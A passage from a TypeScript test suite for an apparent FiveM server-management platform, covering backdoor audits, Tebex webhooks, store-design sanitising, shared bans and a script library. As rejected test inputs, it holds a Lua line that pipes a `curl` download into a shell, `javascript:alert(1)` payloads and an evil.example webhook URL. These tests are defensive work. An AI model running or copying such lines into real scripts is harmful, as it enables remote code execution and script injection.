      { name: "paid", state: "started", meta: { fx_version: "cerulean" }, protected: true, files: [{ ...file("client.lua", "client", h("c")), enc: true }] }
    ]
  };
  const results = new Map([[`${h("b")}:server:.lua`, m.auditRules.analyzeFile("server.lua", CIPHER, "server")]]);
  const report = m.auditRules.buildReport(inv, results, { build: 7290, recommended: 12000, critical: 5000 });
  const rules = report.findings.map((f) => `${f.rule}:${f.resource ?? ""}`);
  for (const expected of [
    "hidden_code:shop", "known_backdoor:shop", "missing_dependency:shop", "old_fx_version:shop", "no_lua54:shop", "oversized_asset:shop",
    "duplicate_asset:shop", "legacy_manifest:old", "protected:paid", "scripthook:", "open_ace:", "wide_ace:", "rcon:", "old_artifacts:", "ensure_order:shop", "not_analyzed:"
  ]) assert.ok(rules.includes(expected), `${expected} missing in ${rules.join(", ")}`);
  assert.equal(report.findings.filter((f) => f.rule === "wide_ace").length, 1, "the agent's own ace is expected");
  assert.ok(!rules.includes("missing_dependency:shop") || !report.findings.some((f) => f.rule === "missing_dependency" && /onesync/.test(f.detail)));
  assert.deepEqual(report.findings.slice(0, 3).map((f) => f.severity), ["critical", "critical", "critical"]);
  assert.ok(report.score <= 35, `score ${report.score}`);
  assert.ok(report.categories.security.score <= 40);
  assert.equal(report.stats.protected, 1);
  assert.equal(report.stats.skipped, 1); // es_extended/server.lua: no result

  const clean = m.auditRules.score([]);
  assert.equal(clean.score, 100);
  // A rule repeated many times weighs less than as many different problems.
  const many = Array.from({ length: 20 }, () => ({ ...report.findings.find((f) => f.rule === "no_lua54")!, severity: "medium" as const }));
  assert.ok(m.auditRules.score(many).categories.maintenance.score > 100 - 20 * 4);
});

test("audit flow: inventory without code, only unknown files sent, hashes checked, shared reputation, report and history", async () => {
  const crypto = await import("node:crypto");
  const sha = (s: string) => crypto.createHash("sha256").update(s, "utf8").digest("hex");
  const SA = "audit-a";
  const SB = "audit-b";
  const backdoor = CIPHER;
  const config = "Config = {}\nConfig.Price = 10";
  const inventory = (scanId: number | null) => ({
    scanId,
    convars: {},
    cfg: [],
    resources: [{
      name: "shop", state: "started", meta: { fx_version: "cerulean", lua54: "yes" },
      files: [
        { p: "server.lua", size: backdoor.length, hash: sha(backdoor), role: "server" as const, kind: "code" as const },
        { p: "config.lua", size: config.length, hash: sha(config), role: "shared" as const, kind: "code" as const }
      ]
    }]
  });

  const scanId = await m.audit.createScan(SA, A, "manual");
  assert.ok(await m.audit.runningScan(SA));
  const first = await m.audit.receiveInventory(SA, m.audit.inventorySchema.parse(inventory(scanId)));
  assert.equal(first.scanId, scanId);
  assert.equal(first.need.length, 2);
  const key = (role: string, hash: string) => `${hash}:${role}:.lua`;
  // Content that does not match its hash is ignored (nobody can whitelist a backdoor by sending other code).
  assert.equal(await m.audit.receiveFiles(SA, { scanId, files: [{ key: key("server", sha(backdoor)), path: "server.lua", content: "print('clean')" }] }), 0);
  assert.equal(await m.audit.receiveFiles(SA, { scanId, files: [
    { key: key("server", sha(backdoor)), path: "server.lua", content: backdoor },
    { key: key("shared", sha(config)), path: "config.lua", content: config }
  ] }), 2);
  const report = await m.audit.finishScan(SA, scanId, { artifacts: null });
  assert.ok(report.findings.some((f) => f.rule === "known_backdoor" && f.resource === "shop" && f.file === "server.lua"));
  assert.equal(report.stats.analyzed, 2);
  const stored = await db.get<{ inventory_json: string | null; report_json: string }>("SELECT inventory_json, report_json FROM audit_scans WHERE id = ?", [scanId]);
  assert.equal(stored!.inventory_json, null);
  assert.ok(!stored!.report_json.includes("Config.Price"), "code that is not a problem is never kept");

  // Another server with the same files: nothing to send, same result (reputation by hash).
  const auto = await m.audit.receiveInventory(SB, m.audit.inventorySchema.parse({ ...inventory(null), auto: true }));
  assert.deepEqual(auto.need, []);
  const reportB = await m.audit.finishScan(SB, auto.scanId, { artifacts: null });
  assert.equal(reportB.score, report.score);
  assert.equal((await m.audit.listScans(SB))[0].trigger, "auto");

  // Confidential mode: no file is asked for.
  const conf = await m.audit.receiveInventory(SB, m.audit.inventorySchema.parse({ ...inventory(null), confidential: true, resources: [{ ...inventory(null).resources[0], files: [{ p: "new.lua", size: 3, hash: sha("x=1"), role: "server", kind: "code" }] }] }));
  assert.deepEqual(conf.need, []);
  await m.audit.failScan(SB, conf.scanId, "test");
  assert.equal((await m.audit.listScans(SB))[0].status, "failed");

  assert.equal(await m.audit.shouldAutoScan(SA), false); // continuous audit off
  await m.audit.saveAuditSettings(SA, { discordId: A }, { continuous: true, alert: true });
  assert.equal(await m.audit.shouldAutoScan(SA), false); // a scan just ran
  assert.equal(await m.audit.shouldAutoScan(SA, new Date(Date.now() + 30 * 60_000)), true);

  delete process.env.AI_API_KEY;
  await assert.rejects(m.audit.explainFinding(SA, scanId, 0), /ai_not_configured/);
  assert.deepEqual(m.audit.parseExplanation('```json\n{"verdict":"false_positive","explanation":"Sûr.","fix":null}\n```'), { verdict: "false_positive", explanation: "Sûr.", fix: null });
  assert.equal(m.audit.parseExplanation('{"verdict":"maybe","explanation":"x"}'), null);

  assert.equal((await m.audit.latestReport(SA))!.id, scanId);
  await assert.rejects(m.audit.receiveFiles(SA, { scanId, files: [] }), /unknown_scan/); // finished scans accept nothing
  assert.equal(m.agent.COMMANDS.audit.permission, "security_config");
});

test("tebex: secrets sealed with AES-GCM, signature as Tebex computes it, errors mapped", async () => {
  const t = await import("../src/lib/tebex");
  const sealed = t.encryptSecret("abc123secret");
  assert.notEqual(sealed, t.encryptSecret("abc123secret")); // random IV
  assert.equal(t.decryptSecret(sealed), "abc123secret");
  assert.equal(t.decryptSecret(sealed.slice(0, -2) + "xx"), null); // altered
  assert.equal(t.decryptSecret("garbage"), null);
  const crypto = await import("node:crypto");
  const body = '{"id":"x","type":"payment.completed"}';
  const expected = crypto.createHmac("sha256", "whsec").update(crypto.createHash("sha256").update(body).digest("hex")).digest("hex");
  assert.equal(t.tebexSignature(body, "whsec"), expected);
  assert.equal(t.verifyTebexSignature(body, expected.toUpperCase(), "whsec"), true);
  assert.equal(t.verifyTebexSignature(body + " ", expected, "whsec"), false);
  assert.equal(t.verifyTebexSignature(body, null, "whsec"), false);
  assert.deepEqual([403, 404, 422, 429, 500].map(t.tebexError), ["tebex_bad_secret", "tebex_not_found", "tebex_rejected", "tebex_rate_limited", "tebex_http_500"]);
  const shared = await import("../src/lib/tebex-shared");
  assert.equal(shared.formatMoney("12.5", "EUR").replace(/\s/g, " "), "12,50 €");
  assert.equal(shared.paymentStatusMeta("Chargeback").tone, "danger");
  assert.equal(shared.shopConfigSchema.safeParse({ alerts: { webhookUrl: "https://evil.example/x" } }).success, false);
});

test("tebex webhooks: validation echoed, signature required, personal data dropped, duplicates ignored, figures and alerts", async () => {
  const t = await import("../src/lib/tebex");
  const actor = { discordId: A, username: "Alice" };
  assert.deepEqual(await t.saveShopConfig(S, actor, { webhookSecret: "whsec_test_1234" }), { ok: true, account: null });
  const settings = await t.getShopSettings(S);
  assert.equal(settings.configured, false); // no Plugin API secret yet
  assert.equal(settings.hasWebhookSecret, true);
  const key = settings.webhookKey as string;
  assert.ok(key && key.length >= 16);

  const send = (hook: object, secret = "whsec_test_1234") => {
    const raw = JSON.stringify(hook);
    return t.receiveWebhook(key, raw, t.tebexSignature(raw, secret));
  };
  assert.deepEqual(await t.receiveWebhook(key, JSON.stringify({ id: "v-1", type: "validation.webhook", subject: {} }), null), { status: 200, body: { id: "v-1" } });
  assert.equal((await t.receiveWebhook("nope-nope-nope-nope", "{}", null)).status, 404);

  const now = new Date();
  const payment = (id: string, type: string, amount: number, product: string) => ({
    id, type, date: now.toISOString(),
    subject: {
      transaction_id: `tbx-${id}`, status: { id: 1, description: "Complete" },
      price_paid: { amount, currency: "EUR" }, payment_method: { name: "PayPal" },
      customer: { first_name: "Jean", email: "jean@example.com", ip: "1.2.3.4", username: { id: "4242", username: "Jeannot" }, country: "FR" },
      products: [{ id: 7, name: product, quantity: 1, paid_price: { amount, currency: "EUR" } }], coupons: [{ code: "NOEL" }]
    }
  });
  assert.equal((await send(payment("p1", "payment.completed", 10, "VIP"), "wrong-secret")).status, 401);
  assert.deepEqual((await send(payment("p1", "payment.completed", 10, "VIP"))).body, { ok: true, duplicate: false });
  assert.deepEqual((await send(payment("p1", "payment.completed", 10, "VIP"))).body, { ok: true, duplicate: true });
  await send(payment("p2", "payment.completed", 25, "VIP"));
  await send(payment("p3", "payment.refunded", 10, "VIP"));
  await send({ id: "r1", type: "recurring-payment.ended", date: now.toISOString(), subject: { reference: "tbx-r-1", status: { description: "Cancelled" }, price: { amount: 5, currency: "EUR" }, initial_payment: payment("x", "", 5, "Abo").subject } });

  const stored = await db.get<Record<string, string>>("SELECT * FROM tebex_events WHERE id = 'p1'");
  assert.equal(stored?.customer_name, "Jeannot");
  assert.equal(stored?.customer_id, "4242");
  assert.ok(!JSON.stringify(stored).includes("jean@example.com") && !JSON.stringify(stored).includes("1.2.3.4"));

  const o = await t.shopOverview(S, now);
  assert.equal(o.currency, "EUR");
  assert.deepEqual([o.revenue30, o.refunded30, o.orders30, o.average30, o.customers30, o.problems30], [35, 10, 2, 17.5, 1, 2]);
  assert.deepEqual(o.topPackages[0], { name: "VIP", quantity: 2, amount: 35 });
  assert.equal(o.daily.length, 30);
  assert.equal(o.daily[29].amount, 35);
  assert.equal((await t.listShopEvents(S, { family: "problems" })).length, 2);
  assert.equal((await t.eventsForTransaction(S, "tbx-p1")).length, 1);
  assert.equal((await t.shopEventsForPlayer(S, ["license:x", "fivem:4242"])).length, 4);

  const alerts = { webhookUrl: "https://discord.com/api/webhooks/1/x", purchases: false, problems: true };
  assert.equal(t.shouldAlertShop(alerts, "payment.completed"), false);
  assert.equal(t.shouldAlertShop(alerts, "payment.dispute.opened"), true);
  assert.equal(t.shouldAlertShop(alerts, "payment.dispute.won"), false);
  assert.equal(t.shouldAlertShop({ ...alerts, webhookUrl: null }, "payment.refunded"), false);

  const rotated = await t.rotateWebhookKey(S, actor);
  assert.equal((await t.receiveWebhook(key, "{}", null)).status, 404); // the old address stops working
  assert.equal((await t.getShopSettings(S)).webhookKey, rotated);
});

test("store design: one cleaner for editor and AI (no HTML, https links only, bounded values, unique ids)", async () => {
  const sd = await import("../src/lib/store-design");
  const d = sd.cleanStoreDesign({
    preset: "neon",
    theme: { accent: "red", radius: 99, font: "Comic Sans", caps: "yes" },
    brand: { name: "<b>X</b>".repeat(30), logo: "javascript:alert(1)", discord: "https://discord.gg/abc", connect: "connect cfx.re/join/AbC123" },
    blocks: [
      { id: "same", type: "hero", p: { title: "Salut", image: "http://insecure.example/x.png", size: "huge" } },
      { id: "same", type: "featured", p: { packageId: "12" } },
      { type: "evil", p: {} },
      { type: "faq", p: { items: [{ q: "Q", a: "R", extra: "x" }] } },
      { type: "categories", p: { categoryIds: [3, 3, -1, "4"], columns: 9 } }
    ],
    legal: { terms: "https://ex.com/cgv" }
  });
  const neon = sd.PRESETS.find((p) => p.key === "neon")!.theme;
  assert.equal(d.theme.accent, neon.accent); // invalid colour -> the preset's
  assert.equal(d.theme.radius, 28);
  assert.equal(d.theme.font, neon.font);
  assert.equal(d.theme.caps, neon.caps);
  assert.equal(d.brand.name.length, 60);
  assert.equal(d.brand.logo, "");
  assert.equal(d.brand.discord, "https://discord.gg/abc");
  assert.equal(sd.connectLink(d.brand.connect), "fivem://connect/cfx.re/join/abc123");
  assert.deepEqual(d.blocks.map((b) => b.type), ["hero", "featured", "faq", "categories"]);
  assert.equal(new Set(d.blocks.map((b) => b.id)).size, 4);
  assert.equal(d.blocks[0].p.image, "");
  assert.equal(d.blocks[0].p.size, "lg");
  assert.equal(d.blocks[1].p.packageId, 12);
  assert.deepEqual(d.blocks[2].p.items, [{ q: "Q", a: "R" }]);
  assert.deepEqual([d.blocks[3].p.categoryIds, d.blocks[3].p.columns], [[3, 4], 4]);
  assert.equal(d.legal.terms, "https://ex.com/cgv");
  assert.equal(d.branding, true);

  assert.equal(sd.connectLink("play.monserveur.fr:30120"), "fivem://connect/play.monserveur.fr:30120");
  assert.equal(sd.connectLink("javascript:alert(1)"), "");
  assert.deepEqual(["gta-sun", "ab", "admin", "a--b", "-x-", "Shop"].map(sd.isValidStoreSlug), [true, false, false, false, false, false]);
  assert.equal(sd.htmlToText("<p>Le <b>VIP</b></p><ul><li>Voiture</li><li>Skin &amp; arme</li></ul><script>x</script>"), "Le VIP\n• Voiture\n• Skin & arme\nx");

  const pruned = sd.pruneDesign(d, { packages: new Set([5]), categories: new Set([4]), goals: new Set() });
  assert.equal(pruned.blocks[1].p.packageId, null);
  assert.deepEqual(pruned.blocks[3].p.categoryIds, [4]);

  const starter = sd.starterDesign("sunset", { name: "Demo", firstPackageId: 7, hasGoals: true });
  assert.equal(starter.preset, "sunset");
  assert.deepEqual(starter.blocks.map((b) => b.type), ["hero", "server", "featured", "categories", "features", "goal", "recent", "faq"]);
  assert.equal(starter.blocks[2].p.packageId, 7);
});

test("store creator: draft, publish, address, versions, AI reply, checkout items", async () => {
  const store = await import("../src/lib/store");
  const sd = await import("../src/lib/store-design");
  const created = await m.servers.createServer({ name: "Shop RP", guildId: null, createdBy: A });
  assert.ok(created.ok);
  const server = created.server;
  const actor = { discordId: A, username: "Alice" };
  const data = { ...sd.EMPTY_STORE_DATA, categories: [{ id: 1, name: "VIP", description: "", packages: [
    { id: 10, name: "VIP Or", description: "", image: "", price: 15, basePrice: 15, discount: 0, currency: "EUR", type: "single", quantity: false, categoryId: 1, expires: false },
    { id: 11, name: "Argent", description: "", image: "", price: 5, basePrice: 5, discount: 0, currency: "EUR", type: "single", quantity: true, categoryId: 1, expires: false }
  ] }] };

  const site = await store.ensureStoreSite(server, data);
  assert.equal(site.slug, server.id);
  assert.equal(site.published, null);
  assert.equal(site.dirty, true);
  assert.equal(site.draft.blocks.find((b) => b.type === "featured")?.p.packageId, 10); // middle price of the first category
  assert.equal(store.featuredPick({ ...data, recent: [{ name: "Bob", item: "Argent", at: new Date().toISOString() }] }), 11); // most bought first
  assert.equal((await store.ensureStoreSite(server, data)).slug, site.slug); // created once

  assert.equal(await store.getPublicStore(site.slug), null); // not published yet
  const edited = { ...site.draft, brand: { ...site.draft.brand, name: "Ma Boutique" } };
  const saved = await store.saveDraft(server.id, actor, edited);
  assert.equal(saved.draft.brand.name, "Ma Boutique");
  const published = await store.publishStore(server.id, actor);
  assert.equal(published.dirty, false);
  assert.ok(published.publishedAt);
  const pub = await store.getPublicStore(site.slug);
  assert.equal(pub?.design.brand.name, "Ma Boutique");
  assert.equal(pub?.draft, false);

  await store.saveDraft(server.id, actor, { ...edited, brand: { ...edited.brand, name: "Brouillon" } });
  assert.equal((await store.getPublicStore(site.slug))?.design.brand.name, "Ma Boutique"); // visitors still see the published one
  assert.equal((await store.getPublicStore(site.slug, { draft: true }))?.design.brand.name, "Brouillon");
  assert.equal((await store.getStoreSite(server.id))?.dirty, true);

  await assert.rejects(store.setStoreSlug(server.id, actor, "admin"), /invalid_slug/);
  const other = await m.servers.createServer({ name: "Other RP", guildId: null, createdBy: A });
  assert.ok(other.ok);
  await store.ensureStoreSite(other.server, data);
  await assert.rejects(store.setStoreSlug(server.id, actor, other.server.id), /slug_taken/);
  const moved = await store.setStoreSlug(server.id, actor, "boutique-shop");
  assert.equal(moved.slug, "boutique-shop");
  assert.equal(await store.getPublicStore(site.slug), null);
  assert.ok(await store.getPublicStore("boutique-shop"));

  const versions = await store.listStoreVersions(server.id);
  assert.equal(versions[0].source, "publish");
  const restored = await store.restoreStoreVersion(server.id, actor, versions[0].id);
  assert.equal(restored.draft.brand.name, "Ma Boutique");
  assert.equal((await store.listStoreVersions(server.id))[0].source, "restore");
  const unpub = await store.unpublishStore(server.id, actor);
  assert.equal(unpub.published, null);
  assert.equal(await store.getPublicStore("boutique-shop"), null);
  const logs = await db.all<{ action: string }>("SELECT action FROM audit_log WHERE server_id = ? AND action LIKE 'store_%' ORDER BY id", [server.id]);
  assert.deepEqual(logs.map((l) => l.action), ["store_publish", "store_slug", "store_restore", "store_unpublish"]);

  const reply = store.parseStoreAIReply('Voici :\n```json\n{"summary":"Thème néon","design":{"preset":"neon","blocks":[{"type":"hero","p":{"title":"Yo"}},{"type":"featured","p":{"packageId":999}}]}}\n```');
  assert.equal(reply?.summary, "Thème néon");
  assert.equal(reply?.design.preset, "neon");
  const kept = store.designFor(reply!.design, data);
  assert.equal(kept.blocks[1].p.packageId, null); // invented package dropped
  assert.equal(store.parseStoreAIReply("pas de json"), null);
  assert.match(store.catalogForAI(data), /10 « VIP Or » 15 EUR/);

  assert.deepEqual(store.cleanItems([{ packageId: 10, quantity: 5 }, { packageId: 11, quantity: 300 }, { packageId: 999, quantity: 1 }, { packageId: 11, quantity: 2 }], data), [
    { packageId: 10, quantity: 1 }, // quantity disabled in Tebex
    { packageId: 11, quantity: 2 }
  ]);
});

// ---- Fiverax network & library ----

test("network: bans are shared between members only, on hashed identifiers and tokens, private / revoked bans excluded", async () => {
  const net = await import("../src/lib/network");
  const keys = await import("../src/lib/network-keys");
  const mk = async (name: string) => {
    const r = await m.servers.createServer({ name, guildId: null, createdBy: A });
    assert.ok(r.ok);
    return r.server.id;
  };
  const [N1, N2, N3] = [await mk("Net Alpha"), await mk("Net Bravo"), await mk("Net Charlie")];
  const t = Math.floor(Date.now() / 1000);
  const join = (srv: string, session: string, identifiers: string[], tokens: string[] = []) =>
    agentCall(srv, { events: [{ type: "join", session, name: "Rogue", identifiers, tokens, timestamp: t }] });
  await join(N1, "n1", ["license:rogue1", `discord:${B}`, "ip:1.2.3.4"], ["3:hw-rogue"]);
  await join(N3, "n3", ["license:rogue3"], ["3:hw-rogue"]);
  const p1 = (await m.players.listPlayers(N1)).rows[0].id;
  const p3 = (await m.players.listPlayers(N3)).rows[0].id;
  await m.security.banPlayer(N1, { discordId: A }, { playerId: p1, reason: "Menu de triche", source: "manual", expiresAt: null, category: "cheat" });

  // Keys are hashes, never the raw identifiers (and never the IP).
  const stored = await db.all<{ key: string; kind: string }>("SELECT key, kind FROM network_ban_keys WHERE server_id = ?", [N1]);
  assert.deepEqual(stored.map((k) => k.kind).sort(), ["discord", "license", "token"]);
  assert.ok(stored.every((k) => /^[a-f0-9]{40}$/.test(k.key)));
  assert.equal(keys.networkKey("LICENSE:Rogue1"), keys.networkKey("license:rogue1"));

  // Not a member: sees nothing. Reciprocal: the banning server must be a member too.
  assert.equal(await net.reputation(N2, ["license:rogue1"], []), null);
  await net.saveMembership(N2, { discordId: A }, m.networkShared.networkSettingsSchema.parse({}));
  assert.equal((await net.reputation(N2, ["license:rogue1"], []))!.servers, 0);
  await net.saveMembership(N1, { discordId: A }, m.networkShared.networkSettingsSchema.parse({ mode: "block", minServers: 1 }));

  const rep = (await net.reputation(N2, ["license:rogue1"], []))!;
  assert.equal(rep.servers, 1);
  assert.deepEqual([rep.records[0].serverName, rep.records[0].category, rep.records[0].reason], ["Net Alpha", "cheat", "Menu de triche"]);
  assert.deepEqual(rep.records[0].matchedOn, ["license"]);
  // Another license, same PC: recognised by the hardware token.
  assert.deepEqual((await net.reputation(N2, ["license:other"], ["3:hw-rogue"]))!.records[0].matchedOn, ["token"]);
  // A server never sees its own bans as network bans.
  assert.equal((await net.reputation(N1, ["license:rogue1"], []))!.servers, 0);

  // Private ban: gone from the network; shared again: back.
  const banId = (await m.security.listBans(N1))[0].id;
  assert.equal(await m.security.setBanSharing(N1, { discordId: A }, banId, { shared: false }), true);
  assert.equal((await net.reputation(N2, ["license:rogue1"], []))!.servers, 0);
  await m.security.setBanSharing(N1, { discordId: A }, banId, { shared: true });

  // Bans older than the membership get their keys when the server joins (backfill).
  await m.security.banPlayer(N3, { discordId: A }, { playerId: p3, reason: "Duplication", source: "manual", expiresAt: null, category: "exploit" });
  await db.run("DELETE FROM network_ban_keys WHERE server_id = ?", [N3]);
  await net.saveMembership(N3, { discordId: A }, m.networkShared.networkSettingsSchema.parse({}));
  assert.equal((await net.reputation(N2, ["license:x"], ["3:hw-rogue"]))!.servers, 2);

  // Verdict: block needs enough servers, in the chosen categories.
  const both = (await net.reputation(N2, ["license:rogue1"], ["3:hw-rogue"]))!;
  const settings = (o: object) => m.networkShared.networkSettingsSchema.parse({ mode: "block", ...o });
  assert.equal(m.networkShared.networkVerdict(both, settings({ minServers: 2 })).blocked, true);
  assert.equal(m.networkShared.networkVerdict(both, settings({ minServers: 3 })).blocked, false);
  assert.equal(m.networkShared.networkVerdict(both, settings({ minServers: 2, blockCategories: ["cheat"] })).blocked, false);
  assert.equal(m.networkShared.networkVerdict(both, settings({ mode: "alert", minServers: 1 })).blocked, false);
  assert.match(m.networkShared.networkVerdict(both, settings({ minServers: 2 })).message ?? "", /2 autres serveurs/);

  // The agent learns the mode; the connection check answers.
  const sec = await agentCall(N1, { secRev: 0 });
  assert.deepEqual(sec.security?.network, { mode: "block" });
  assert.equal((await net.checkConnection(N1, ["license:nobody"], [])).blocked, false);
  assert.equal((await net.checkConnection(N1, ["license:z"], ["3:hw-rogue"])).blocked, true); // N3 banned that PC
  assert.equal((await net.checkConnection(N2, ["license:z"], ["3:hw-rogue"])).blocked, false); // N2 only alerts

  // Revoked / left: no longer counts.
  await m.security.revokeBan(N3, { discordId: A }, (await m.security.listBans(N3))[0].id);
  assert.equal((await net.reputation(N2, ["license:x"], ["3:hw-rogue"]))!.servers, 1);
  assert.equal(await net.leaveNetwork(N1, { discordId: A }), true);
  assert.equal((await net.reputation(N2, ["license:rogue1"], []))!.servers, 0);
  assert.equal(await net.reputation(N1, ["license:rogue1"], []), null);
  await net.saveMembership(N1, { discordId: A }, m.networkShared.networkSettingsSchema.parse({}));

  assert.deepEqual(net.lookupIdentifiers("  123456789012345678 "), ["discord:123456789012345678"]);
  assert.deepEqual(net.lookupIdentifiers("license:abc"), ["license:abc"]);
  assert.deepEqual(net.lookupIdentifiers("bonjour"), []);
  assert.ok((await net.listMembers()).some((x) => x.name === "Net Alpha"));
  assert.ok((await net.recentNetworkBans(N2)).some((b) => b.reason === "Menu de triche"));
  const actions = (await db.all<{ action: string }>("SELECT action FROM audit_log WHERE server_id = ? ORDER BY id", [N1])).map((r) => r.action);
  assert.ok(["network_join", "network_leave", "ban_sharing", "player_ban"].every((a) => actions.includes(a)));
  await net.saveMembership(N2, { discordId: A }, m.networkShared.networkSettingsSchema.parse({ mode: "off" }));
  assert.equal((await net.getMembership(N2))?.settings.mode, "off");
  assert.ok((await db.all<{ action: string }>("SELECT action FROM audit_log WHERE server_id = ?", [N2])).some((r) => r.action === "network_settings"));
});

test("network: alert mode flags a banned player at their arrival, once a day", async () => {
  const net = await import("../src/lib/network");
  const r = await m.servers.createServer({ name: "Net Delta", guildId: null, createdBy: A });
  assert.ok(r.ok);
  const N4 = r.server.id;
  await net.saveMembership(N4, { discordId: A }, m.networkShared.networkSettingsSchema.parse({ mode: "alert" }));
  const t = Math.floor(Date.now() / 1000);
  await agentCall(N4, { events: [{ type: "join", session: "d1", name: "Rogue", identifiers: ["license:rogue1"], tokens: [], timestamp: t }] });
  await agentCall(N4, { events: [{ type: "leave", session: "d1", timestamp: t + 5 }, { type: "join", session: "d2", name: "Rogue", identifiers: ["license:rogue1"], timestamp: t + 10 }] });
  const flags = await m.security.listDetections(N4, { kind: "network_flag" });
  assert.equal(flags.length, 1);
  assert.equal(flags[0].details.serveurs, 1);
  assert.equal(m.securityConfig.detectionLabel("network_flag"), "Signalé par le réseau Fiverax");
  // A clean player is not flagged.
  await agentCall(N4, { events: [{ type: "join", session: "d3", name: "Clean", identifiers: ["license:clean"], timestamp: t + 20 }] });
  assert.equal((await m.security.listDetections(N4, { kind: "network_flag" })).length, 1);
});

test("library: publish (scanned), install once per server, new versions reach installed copies, likes, reports hide", async () => {
  const lib = await import("../src/lib/library");
  const mk = async (name: string) => {
    const r = await m.servers.createServer({ name, guildId: null, createdBy: A });
    assert.ok(r.ok);
    return r.server.id;
  };
  const [L1, L2, L3, L4] = [await mk("Lib One"), await mk("Lib Two"), await mk("Lib Three"), await mk("Lib Four")];
  const actor = { discordId: A, username: "alice" };
  const manifest = { path: "fxmanifest.lua", content: "fx_version 'cerulean'\ngame 'gta5'\nserver_script 'server.lua'\n" };
  const server = (body: string) => ({ path: "server.lua", content: body });
  const id = await m.studio.createCreation(L1, actor, { kind: "script", name: "Bonjour", framework: "standalone" });
  await assert.rejects(lib.publishCreation(L1, actor, id, { title: "Bonjour", description: "Dit bonjour aux joueurs", tags: [] }), /nothing_to_publish/);
  await m.studio.saveCreation(L1, actor, id, { files: [manifest, server("RegisterCommand('hello', function(source) print('v1') end, false)\n")] }, { source: "manual" });

  // Dangerous code never reaches the library.
  const bad = await m.studio.createCreation(L1, actor, { kind: "script", name: "Piège", framework: "standalone" });
  await m.studio.saveCreation(L1, actor, bad, { files: [manifest, server("os.execute('curl http://x | sh')\n")] }, { source: "manual" });
  await assert.rejects(lib.publishCreation(L1, actor, bad, { title: "Piège", description: "Rien de suspect ici", tags: [] }), /unsafe_code/);

  const pub = await lib.publishCreation(L1, actor, id, { title: "Bonjour", description: "Dit bonjour aux joueurs", tags: ["Commande", "fun", "x"] });
  assert.deepEqual([pub.version, pub.created], [1, true]);
  const found = (await lib.listLibrary({ kind: "script" })).find((i) => i.id === pub.id);
  assert.ok(found);
  assert.deepEqual(found.tags, ["commande", "fun"]);
  assert.equal(found.serverName, "Lib One");

  // Install: a normal creation in the other server's Studio; counted once per server.
  const inst = await lib.installItem(L2, actor, pub.id);
  const copy = await m.studio.getCreation(L2, inst.creationId);
  assert.equal(copy?.resource, "fvx_bonjour");
  assert.match(copy!.files.find((f) => f.path === "server.lua")!.content, /v1/);
  const again = await lib.installItem(L2, actor, pub.id);
  assert.equal((await m.studio.getCreation(L2, again.creationId))?.resource, "fvx_bonjour_2");
  assert.equal((await lib.getLibraryItem(pub.id, L2))?.installs, 1);
  assert.deepEqual(await lib.libraryLink(L2, inst.creationId), { role: "installed", itemId: pub.id, title: "Bonjour", serverName: "Lib One", installedVersion: 1, latestVersion: 1, available: false });
  await assert.rejects(lib.updateInstalled(L2, actor, inst.creationId), /up_to_date/);

  // New version: the copy is offered the update, which replaces its files (history kept).
  await m.studio.saveCreation(L1, actor, id, { files: [manifest, server("RegisterCommand('hello', function(source) print('v2') end, false)\n")] }, { source: "manual" });
  const v2 = await lib.publishCreation(L1, actor, id, { title: "Bonjour", description: "Dit bonjour aux joueurs", tags: [], changelog: "Nouveau message" });
  assert.deepEqual([v2.id, v2.version, v2.created], [pub.id, 2, false]);
  const link = await lib.libraryLink(L2, inst.creationId);
  assert.ok(link?.role === "installed" && link.available);
  const updated = await lib.updateInstalled(L2, actor, inst.creationId);
  assert.match(updated.files.find((f) => f.path === "server.lua")!.content, /v2/);
  assert.equal(updated.versions[0].source, "library");
  const after = await lib.libraryLink(L2, inst.creationId);
  assert.ok(after?.role === "installed" && !after.available && after.installedVersion === 2);
  assert.equal((await lib.libraryLink(L1, id))?.role, "published");

  // Likes toggle; reports from 3 servers hide it until a platform owner puts it back.
  assert.deepEqual(await lib.toggleLike(L2, actor, pub.id), { liked: true, likes: 1 });
  assert.deepEqual(await lib.toggleLike(L2, actor, pub.id), { liked: false, likes: 0 });
  await assert.rejects(lib.reportItem(L1, actor, pub.id, "le mien"), /own_item/);
  assert.deepEqual(await lib.reportItem(L2, actor, pub.id, "Ne marche pas"), { hidden: false });
  await assert.rejects(lib.reportItem(L2, actor, pub.id, "encore"), /already_reported/);
  await lib.reportItem(L3, actor, pub.id, "Suspect");
  assert.deepEqual(await lib.reportItem(L4, actor, pub.id, "Volé"), { hidden: true });
  assert.equal((await lib.listLibrary()).some((i) => i.id === pub.id), false);
  assert.equal(await lib.getLibraryItem(pub.id, L2), null); // hidden from the others
  assert.equal((await lib.getLibraryItem(pub.id, L1))?.status, "hidden"); // the publisher still sees it
  await assert.rejects(lib.installItem(L3, actor, pub.id), /unknown_item/);
  await assert.rejects(lib.publishCreation(L1, actor, id, { title: "Bonjour", description: "Dit bonjour aux joueurs", tags: [] }), /item_hidden/);
  assert.equal((await lib.itemReports(pub.id)).length, 3);
  assert.equal(await lib.moderateItem(pub.id, "published"), true);
  assert.equal((await lib.getLibraryItem(pub.id, L2))?.reports, 0);

  // Withdrawn by the publisher: copies stay.
  assert.equal(await lib.unpublishItem(L1, actor, pub.id), true);
  assert.equal((await lib.listLibrary()).some((i) => i.id === pub.id), false);
  assert.ok(await m.studio.getCreation(L2, inst.creationId));

  assert.equal(lib.fileRole("client/main.lua", "client_scripts { 'client/main.lua' }"), "client");
  assert.equal(lib.fileRole("html/index.html", ""), "ui");
  const logs = (await db.all<{ action: string }>("SELECT action FROM audit_log WHERE server_id = ? AND action LIKE 'library_%'", [L2])).map((r) => r.action);
  assert.ok(logs.includes("library_install") && logs.includes("library_update") && logs.includes("library_report"));
});

test("troubleshooting assistant: console digest and reply parsing", async () => {
  const t = await import("../src/lib/troubleshoot");
  const line = (id: number, message: string, channel: string | null = null) => ({ id, at: "2026-11-05T12:00:00.000Z", channel, message });
  const lines = [line(1, "SCRIPT ERROR: @mon_job/server.lua:12: attempt to index a nil value", "mon_job"), ...Array.from({ length: 60 }, (_, i) => line(i + 2, `ok ${i}`))];
  const digest = t.consoleDigest(lines);
  assert.match(digest, /Lignes suspectes plus anciennes \(1\)/);
  assert.match(digest, /attempt to index a nil value/);
  assert.doesNotMatch(digest, /ok 0\b/); // old normal lines are dropped

  const known = new Set(["mon_job", "fiverax_agent"]);
  const reply = t.parseTroubleshoot(JSON.stringify({
    answer: "Ta table est nil.",
    actions: [
      { kind: "resource", action: "restart", name: "mon_job" },
      { kind: "resource", action: "restart", name: "inconnue" },
      { kind: "resource", action: "stop", name: "fiverax_agent" },
